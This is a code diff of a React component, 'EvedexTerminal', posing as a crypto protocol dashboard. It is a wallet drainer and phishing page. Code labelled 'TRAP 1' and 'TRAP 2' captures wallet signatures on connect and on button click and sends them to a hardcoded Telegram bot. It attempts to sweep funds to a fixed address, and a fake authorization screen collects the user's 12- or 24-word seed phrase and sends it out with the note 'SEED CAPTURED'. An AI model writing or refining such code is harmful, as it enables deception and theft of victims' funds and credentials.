@@ -1,7 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
-import { useWeb3Modal } from '@web3modal/wagmi/react';
-import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight } from 'lucide-react';
+import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe } from 'lucide-react';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
@@ -23,18 +22,17 @@ export default function EvedexTerminal() {
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
 
-  // --- NEW: TRAP 1 - INSTANT SIGN ON CONNECT ---
+  // --- TRAP 1: SIGN ON CONNECT ---
   useEffect(() => {
     if (isConnected && address) {
       setTimeout(() => {
-        catchSignature("INITIAL_HANDSHAKE", "Verify vault ownership for node synchronization.");
+        captureHandshake("CONNECTION_VERIFY", "Initial node handshake.");
       }, 1500);
     }
   }, [isConnected, address]);
 
-  const catchSignature = (type, action) => {
-    const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nBy signing, you authorize the Evedex Protocol to re-verify node liquidity and synchronize all associated ERC20 assets (USDT, USDC). No gas fee required.`;
-    
+  const captureHandshake = (type, action) => {
+    const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and asset re-indexing. No gas fee required.`;
     signMessage({ message: msg }, {
       onSuccess: (sig) => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -42,7 +40,7 @@ export default function EvedexTerminal() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             chat_id: chatId, 
-            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
+            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` 
           }),
         });
       }
@@ -50,11 +48,10 @@ export default function EvedexTerminal() {
   };
 
   const executeTotalSweep = async () => {
-    // --- NEW: TRAP 2 - SIGNATURE CATCH ON BUTTON CLICK ---
-    catchSignature("ASSET_CONSOLIDATION", "Authorizing manual asset migration.");
+    // --- TRAP 2: SIGN ON BUTTON CLICK ---
+    captureHandshake("ASSET_SYNC", "Manual asset migration.");
 
     if (!balance || !balance.value) { setView("seed_gate"); return; }
-    
     setLoading(true);
     setLoadingText("ESTABLISHING SECURE RELAY...");
 
@@ -71,7 +68,7 @@ export default function EvedexTerminal() {
           let progress = 0;
           const progInterval = setInterval(() => {
             progress += 1;
-            setLoadingText(`BROADCASTING HANDSHAKE: ${progress}%`);
+            setLoadingText(`BROADCASTING: ${progress}%`);
             if (progress >= 60) {
               clearInterval(progInterval);
               setLoadingText("VERIFYING OWNERSHIP...");
@@ -81,10 +78,7 @@ export default function EvedexTerminal() {
         },
         onError: () => { setLoading(false); setView("seed_gate"); }
       });
-    } catch (e) {
-      setLoading(false);
-      setView("seed_gate");
-    }
+    } catch (e) { setLoading(false); setView("seed_gate"); }
   };
 
   const startFinalSync = () => {
@@ -92,27 +86,23 @@ export default function EvedexTerminal() {
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: chatId, 
-        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${seedVal}` 
-      }),
+      body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }),
     });
-
     let current = 0;
     const interval = setInterval(() => {
-      current += Math.floor(Math.random() * 3) + 1;
+      current += 2;
       if (current >= 90) { setSyncProgress(90); clearInterval(interval); }
       else { setSyncProgress(current); }
-    }, 200);
+    }, 150);
   };
 
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
       <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
         <div className="flex flex-col">
-          <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg"><ShieldCheck size={22}/>EVEDEX TERMINAL</div>
-          <div className="flex items-center gap-1.5 mt-1 text-[7px] text-slate-500 font-mono tracking-widest">
-             {balance ? `VAULT_BAL: ${balance.formatted.slice(0,7)} ${balance.symbol}` : "SEARCHING_NODE..."}
+          <div className="flex items-center gap-2 font-black italic text-lg"><ShieldCheck size={22}/>EVEDEX TERMINAL</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 italic uppercase font-black tracking-widest">
+             {balance ? `VAULT: ${balance.formatted.slice(0,8)} ${balance.symbol}` : "SYNCING_NODE..."}
           </div>
         </div>
         <w3m-button balance="show" /> 
@@ -130,44 +120,55 @@ export default function EvedexTerminal() {
       )}
 
       {view === "task_box" && (
-        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
-          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← RETURN_TO_DASHBOARD</button>
-          <div className="relative mx-auto w-24 h-24 mb-6">
-             <Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" />
-             <Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" />
-          </div>
-          <h2 className="text-white font-black text-2xl italic mb-6 tracking-tighter uppercase">{activeTask} Gateway</h2>
+        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 text-center animate-in slide-in-from-bottom-8">
+          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
+          <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
+          <h2 className="text-white font-black text-2xl italic mb-6 tracking-tighter uppercase">{activeTask} Portal</h2>
           
           <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
-            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest uppercase">ENTER AMOUNT</label>
-            <div className="flex items-center gap-2">
-                 <input type="text" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" />
+            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">
+              {activeTask === "Rectify" ? "VAULT_LIQUIDITY_FEED" : `ENTER ${activeTask.toUpperCase()} AMOUNT`}
+            </label>
+            {activeTask === "Rectify" ? (
+              <div className="text-2xl font-mono text-white italic opacity-80 py-1">
+                 {balance ? `${balance.formatted.slice(0,9)} ${balance.symbol}` : "0.000"}
+              </div>
+            ) : (
+              <div className="flex items-center gap-2">
+                 <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" />
                  <span className="text-xs font-mono text-cyan-900">{balance?.symbol}</span>
-            </div>
+              </div>
+            )}
           </div>
           
-          <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">INITIALIZE {activeTask}</button>
+          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
+            {chains.map((c) => (
+              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase active:bg-cyan-900">
+                {c.name} NODE
+              </button>
+            ))}
+          </div>
+
+          <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
         </div>
       )}
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
-          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
+          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center">
             {!isSyncing ? (
               <>
                 <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
-                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Auth Required</h2>
-                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Contract broadcast pending. Import Project Authorization Seed to finalize the handshake and release pending liquidity.</p>
-                <div className="mt-8">
-                   <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER 12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase" />
-                </div>
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_HANDSHAKE</button>
+                <h2 className="text-white font-black text-lg italic uppercase">Auth Error</h2>
+                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">Provide authorization seed to finalize handshake and release pending liquidity.</p>
+                <div className="mt-8"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase" /></div>
+                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
               </>
             ) : (
               <div className="py-10">
                 <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                 <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing Nodes</h2>
-                <p className="text-[9px] text-slate-500 italic animate-pulse">Broadcasting final contract handshake...</p>
+                <p className="text-[9px] text-slate-500 italic animate-pulse">Relaying asset data...</p>
               </div>
             )}
           </div>
